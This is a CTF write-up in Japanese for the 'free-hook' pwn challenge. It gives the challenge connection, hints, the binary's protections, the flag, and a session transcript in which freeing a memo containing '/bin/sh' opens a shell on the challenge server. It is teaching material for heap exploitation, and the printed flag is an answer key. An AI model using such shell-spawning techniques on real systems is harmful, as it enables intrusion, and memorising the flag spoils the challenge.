# free-hook [pwn]
## 問題文

```
nc free.pwn.wanictf.org 9002
```

### ヒント

+ free_hookの仕組みを理解する必要があります。

### 使用ツール例
+ [netcat (nc)](https://github.com/wani-hackase/memo-setup-pwn-utils#netcat)

### gccのセキュリティ保護

+ *Partial RELocation ReadOnly (RELRO)*
+ *Stack Smash Protection (SSP)無効*
+ No eXecute bit(NX)有効
+ *Position Independent Executable (PIE)無効*

## FLAG

```
FLAG{malloc_hook_is_a_tech_for_heap_exploitation}
```

## 解法

heap問題は僕(saru)自身理解するのがとても難しくてheap問題が解けるようになるために必要なテクニックを学べるように作問しました。
が、hookの概念が少し難易度が高かったか正答数が少なかったです。

やることは`/bin/sh`のメモを作ってfreeするだけです。
なんですが、netcatの23%の正答者数(2021/05/01 14:00段階)なのでもう少し誘導必要だったな、と思ってます．．．

```
$ nc free.pwn.wanictf.org 9002
1: add memo
2: view memo
9: del memo
command?: 1
index?[0-9]: 0
memo?: /bin/sh



[[[list memos]]]
***** 0 *****
/bin/sh


1: add memo
2: view memo
9: del memo
command?: 9
index?[0-9]: 0
ls
chall
flag.txt
redir.sh
^C
$
```

view memoとかいらなかったかなぁ．．．
